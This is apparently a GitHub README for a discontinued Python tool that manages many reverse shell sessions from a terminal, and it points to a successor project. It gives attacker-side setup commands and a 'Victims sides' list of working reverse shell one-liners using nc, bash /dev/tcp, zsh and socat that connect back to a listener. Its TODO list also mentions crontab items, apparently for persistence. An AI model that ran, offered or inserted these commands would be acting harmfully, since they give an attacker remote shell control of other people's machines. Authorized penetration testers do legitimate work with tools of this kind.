# Reverse Shell Manager

```
A multiple reverse shell sessions/clients manager via terminal
```

#### :heavy_exclamation_mark: :heavy_exclamation_mark: :heavy_exclamation_mark: 
**This project will not continue develope anymore.**  
**The next generation of this project (Platypus) has been released at https://github.com/WangYihang/Platypus**  

#### [**Platypus**](https://github.com/WangYihang/Platypus)
  * More stable
  * More features
  * Upgrade common reverse shell session to full interactive seession
  * Reverse shell as a Service
  * RESTful API
  * ...

#### Attacker side

> Clone the code

```bash
git clone https://github.com/WangYihang/Reverse-Shell-Manager
cd Reverse-Shell-Manager
```

> Install dependencies

```
pip install poetry
poetry install
```

> Start the server

```
poetry run python Reverse-Shell-Manager.py 0.0.0.0 4444
```

#### Victims sides

> Linux

```
nc -e /bin/bash 1.3.3.7 4444
bash -c 'bash -i >/dev/tcp/1.3.3.7/4444 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 1.3.3.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444  
```

> Windows

```
nc.exe -e /bin/bash 1.3.3.7 4444
```

#### Simple Example Video 

[![asciicast](https://asciinema.org/a/143640.png)](https://asciinema.org/a/143640)

#### YouTube Example
> https://youtu.be/AoS-q1MGw30  


#### TODO
- [x] Add an item to crontab
- [x] Delete an item from crontab
- [ ] create a class to hold Master
- [ ] select/epoll

#### Bugs

- [x] A victim is connected but didn't add to online list
- [ ] socket stuck on rece()

#### LICENSE

```
THE DRINKWARE LICENSE

<wangyihanger@gmail.com> wrote this file. As long as 
you retain this notice you can do whatever you want 
with this stuff. If we meet some day, and you think 
this stuff is worth it, you can buy me the following
drink(s) in return.

Red Bull
JDB
Coffee
Sprite
Cola
Harbin Beer
etc

Wang Yihang
```
